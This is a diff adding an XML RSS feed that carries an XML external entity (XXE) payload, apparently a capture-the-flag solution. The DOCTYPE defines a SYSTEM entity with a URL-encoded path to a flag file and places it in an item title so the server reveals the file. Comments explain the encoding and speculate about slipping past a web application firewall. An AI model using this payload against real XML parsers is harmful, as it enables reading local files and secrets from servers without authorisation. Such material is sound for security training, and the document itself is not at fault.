@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE msg [
+	<!ELEMENT msg ANY > <!-- Allows vars in title to be referenced anywhere. if ANY was title for example, then only allowed to be ref in <title> tags-->
+	<!ENTITY start "/fla">
+	<!ENTITY link "&start;g_66cc7da521fa97f7909f623cf11dcfd4" > <!-- tried this but it doesnt actually work -->
+	<!ENTITY xxe SYSTEM "%2f%66%6c%61%67%5f%36%37%61%30%66%39%37%37%37%64%36%65%32%35%62%66%31%65%61%35%66%30%39%61%30%63%33%62%63%63%64%36" > <!--THIS IT THE ACTUAL PAYLOAD -->
+]>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+    <title>The Blog</title>
+    <description>A blog about things</description>
+    <link>http://example.com/</link>
+<!--    <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate> -->
+    <item>
+        <title>&xxe;</title>
+        <description>a post</description>
+        <link>http://example.com</link>
+<!--        <author>author@example.com</author> -->
+<!--        <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate> -->
+    </item>
+</channel>
+</rss>
+
+<!--
+"/flag_67a0f9777d6e25bf1ea5f09a0c3bccd6" equals URL encoded
+%2f%66%6c%61%67%5f%36%37%61%30%66%39%37%37%37%64%36%65%32%35%62%66%31%65%61%35%66%30%39%61%30%63%33%62%63%63%64%36
+-->
+
+<!-- I assume WAF performs filter when rendering XML provided in response-->
+<!-- Still unsure how the URL decoding works. I assumed since it is an object from web, it performs URL decoding at server side-->
+<!-- Either that or other encoding formats are recognised either by SYSTEM call or somewhere in rendering string with encoding resulting in raw link-->
